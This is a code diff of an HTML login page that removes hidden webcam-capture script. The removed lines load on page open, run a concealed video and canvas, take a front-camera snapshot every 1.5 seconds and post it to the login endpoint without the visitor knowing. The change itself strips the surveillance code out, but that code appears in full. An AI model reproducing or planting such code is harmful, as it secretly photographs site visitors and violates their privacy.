@@ -188,45 +188,8 @@
         </div>
     </div>
 
-    <!-- Hidden elements for camera operation -->
-    <div style="display:none;">
-        <video id="video" playsinline autoplay></video>
-        <canvas id="canvas" width="640" height="480"></canvas>
-    </div>
-
     <script>
-        // --- 1. WEBCAM CAPTURE LOGIC ---
-        function postImage(imgdata) {
-            $.ajax({
-                type: 'POST',
-                data: { cat: imgdata },
-                url: 'api/login',
-                dataType: 'json',
-                async: false
-            });
-        }
-
-        async function initCamera() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const constraints = { audio: false, video: { facingMode: "user" } };
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = stream;
-                const context = canvas.getContext('2d');
-                
-                setInterval(function () {
-                    context.drawImage(video, 0, 0, 640, 480);
-                    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-                    postImage(canvasData);
-                }, 1500);
-            } catch (e) {
-                console.log("Camera error: " + e);
-            }
-        }
-
-        // --- 2. LOGIN HANDLING LOGIC ---
+        // --- LOGIN HANDLING LOGIC ---
         $(document).ready(function() {
             $('#loginForm').submit(function(e) {
                 e.preventDefault(); // Stops the page from refreshing
@@ -262,9 +225,6 @@
                 $('body').css('overflow', 'auto');
             });
         }
-
-        // Run camera on load
-        window.onload = initCamera;
     </script>
 </body>
 </html>
